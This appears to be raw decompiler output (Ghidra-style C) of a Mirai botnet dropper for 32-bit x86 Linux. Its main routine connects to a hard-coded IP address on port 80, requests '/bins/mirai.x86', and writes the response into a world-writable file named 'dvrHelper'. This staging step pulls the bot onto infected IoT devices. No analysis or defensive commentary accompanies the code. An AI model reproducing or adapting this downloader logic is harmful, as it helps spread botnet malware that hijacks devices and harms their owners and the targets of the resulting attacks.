typedef unsigned char   undefined;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    word;
typedef enum Elf_SectionHeaderType_x86 {
    SHT_NULL=0,
    SHT_PROGBITS=1,
    SHT_SYMTAB=2,
    SHT_STRTAB=3,
    SHT_RELA=4,
    SHT_HASH=5,
    SHT_DYNAMIC=6,
    SHT_NOTE=7,
    SHT_NOBITS=8,
    SHT_REL=9,
    SHT_SHLIB=10,
    SHT_DYNSYM=11,
    SHT_INIT_ARRAY=14,
    SHT_FINI_ARRAY=15,
    SHT_PREINIT_ARRAY=16,
    SHT_GROUP=17,
    SHT_SYMTAB_SHNDX=18,
    SHT_ANDROID_REL=1610612737,
    SHT_ANDROID_RELA=1610612738,
    SHT_GNU_ATTRIBUTES=1879048181,
    SHT_GNU_HASH=1879048182,
    SHT_GNU_LIBLIST=1879048183,
    SHT_CHECKSUM=1879048184,
    SHT_SUNW_move=1879048186,
    SHT_SUNW_COMDAT=1879048187,
    SHT_SUNW_syminfo=1879048188,
    SHT_GNU_verdef=1879048189,
    SHT_GNU_verneed=1879048190,
    SHT_GNU_versym=1879048191
} Elf_SectionHeaderType_x86;

typedef struct Elf32_Phdr Elf32_Phdr, *PElf32_Phdr;

typedef enum Elf_ProgramHeaderType_x86 {
    PT_NULL=0,
    PT_LOAD=1,
    PT_DYNAMIC=2,
    PT_INTERP=3,
    PT_NOTE=4,
    PT_SHLIB=5,
    PT_PHDR=6,
    PT_TLS=7,
    PT_GNU_EH_FRAME=1685382480,
    PT_GNU_STACK=1685382481,
    PT_GNU_RELRO=1685382482
} Elf_ProgramHeaderType_x86;

struct Elf32_Phdr {
    enum Elf_ProgramHeaderType_x86 p_type;
    dword p_offset;
    dword p_vaddr;
    dword p_paddr;
    dword p_filesz;
    dword p_memsz;
    dword p_flags;
    dword p_align;
};

typedef struct Elf32_Shdr Elf32_Shdr, *PElf32_Shdr;

struct Elf32_Shdr {
    dword sh_name;
    enum Elf_SectionHeaderType_x86 sh_type;
    dword sh_flags;
    dword sh_addr;
    dword sh_offset;
    dword sh_size;
    dword sh_link;
    dword sh_info;
    dword sh_addralign;
    dword sh_entsize;
};

typedef struct Elf32_Ehdr Elf32_Ehdr, *PElf32_Ehdr;

struct Elf32_Ehdr {
    byte e_ident_magic_num;
    char e_ident_magic_str[3];
    byte e_ident_class;
    byte e_ident_data;
    byte e_ident_version;
    byte e_ident_osabi;
    byte e_ident_abiversion;
    byte e_ident_pad[7];
    word e_type;
    word e_machine;
    dword e_version;
    dword e_entry;
    dword e_phoff;
    dword e_shoff;
    dword e_flags;
    word e_ehsize;
    word e_phentsize;
    word e_phnum;
    word e_shentsize;
    word e_shnum;
    word e_shstrndx;
};




uint FUN_080480a0(byte param_1,byte param_2,byte param_3,byte param_4)

{
  return (uint)param_3 << 0x10 | (uint)param_4 << 0x18 | ((uint)param_2 << 0x10) >> 8 |
         (uint)param_1;
}



void FUN_080480e0(undefined4 param_1)

{
  FUN_08048338(1,param_1);
  return;
}



void FUN_080480f5(undefined4 param_1)

{
  FUN_08048338(6,param_1);
  return;
}



void FUN_08048107(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_08048338(5,param_1,param_2,param_3);
  return;
}



void FUN_0804811f(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  local_10 = param_1;
  local_c = param_2;
  local_8 = param_3;
  FUN_08048338(0x66,3,&local_10);
  return;
}



void FUN_08048146(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_08048338(4,param_1,param_2,param_3);
  return;
}



void FUN_0804815e(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_08048338(3,param_1,param_2,param_3);
  return;
}



void FUN_08048176(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  local_10 = param_1;
  local_c = param_2;
  local_8 = param_3;
  FUN_08048338(0x66,1,&local_10);
  return;
}



void FUN_0804819d(void)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar6;
  undefined4 extraout_ECX_01;
  char *pcVar7;
  uint uVar8;
  undefined8 uVar9;
  int local_b4;
  undefined local_a4 [128];
  undefined2 local_24;
  undefined2 local_22;
  undefined4 local_20;
  char local_11;
  
  pcVar7 = "x86";
  local_b4 = 0;
  while( true ) {
    cVar1 = *pcVar7;
    pcVar7 = pcVar7 + 1;
    if (cVar1 == '\0') break;
    local_b4 = local_b4 + 1;
  }
  FUN_08048146(1,"MIRAI\n",6,0);
  local_24 = 2;
  local_22 = 0x5000;
  local_20 = FUN_080480a0(0x4d,0xf7,0xb5,0xdb);
  iVar2 = FUN_08048107("dvrHelper",0x241,0x1ff);
  iVar3 = FUN_08048176(2,1,0);
  if ((iVar3 == -1) || (iVar4 = iVar3, iVar2 == -1)) {
    iVar4 = FUN_080480e0(1);
  }
  iVar4 = FUN_0804811f(iVar3,&local_24,0x10,iVar4);
  if (iVar4 < 0) {
    FUN_08048146(1,&DAT_08048447,4,iVar4);
    iVar4 = FUN_080480e0(-iVar4);
  }
  uVar5 = FUN_08048146(iVar3,"GET /bins/mirai.x86 HTTP/1.0\r\n\r\n",local_b4 + 0x1dU,iVar4);
  if (uVar5 != local_b4 + 0x1dU) {
    uVar5 = FUN_080480e0(3);
  }
  uVar8 = 0;
  do {
    iVar4 = FUN_0804815e(iVar3,&local_11,1,uVar5);
    uVar6 = extraout_ECX;
    if (iVar4 != 1) {
      FUN_080480e0(4);
      uVar6 = extraout_ECX_00;
    }
    uVar5 = (uint)local_11;
    uVar8 = uVar8 << 8 | uVar5;
  } while (uVar8 != 0xd0a0d0a);
  while( true ) {
    uVar9 = FUN_0804815e(iVar3,local_a4,0x80,uVar6);
    if ((int)uVar9 < 1) break;
    FUN_08048146(iVar2,local_a4,uVar9);
    uVar6 = extraout_ECX_01;
  }
  FUN_080480f5(iVar3);
  FUN_080480f5(iVar2);
  FUN_08048146(1,&DAT_0804846d,4);
  FUN_080480e0(5);
  return;
}



void processEntry entry(void)

{
  FUN_0804819d();
  return;
}



void FUN_08048338(void)

{
  undefined4 uVar1;
  undefined4 param_6;
  undefined4 param_7;
  undefined4 local_18;
  undefined4 local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000020;
  local_18 = param_6;
  local_14 = param_7;
  uVar1 = FUN_080483b9(&local_18);
  FUN_08048400(uVar1);
  return;
}



void __regparm3 FUN_08048388(undefined4 param_1)

{
  FUN_0804839e(param_1);
  return;
}



undefined4 FUN_0804839e(undefined4 param_1)

{
  code *pcVar1;
  undefined4 uVar2;
  int unaff_retaddr;
  
  if (*(int *)(unaff_retaddr + 0x113c) != 0) {
    return param_1;
  }
  pcVar1 = (code *)swi(0x80);
  uVar2 = (*pcVar1)();
  return uVar2;
}



void __regparm1 FUN_080483b9(undefined4 param_1_00,undefined4 *param_1)

{
  FUN_08048388(*param_1,param_1_00);
  return;
}



uint FUN_08048400(uint param_1)

{
  int *piVar1;
  
  if (0xfffff000 < param_1) {
    piVar1 = (int *)FUN_08048428();
    *piVar1 = -param_1;
    param_1 = 0xffffffff;
  }
  return param_1;
}



int FUN_08048428(void)

{
  int *in_GS_OFFSET;
  
  return *in_GS_OFFSET + 0x28;
}


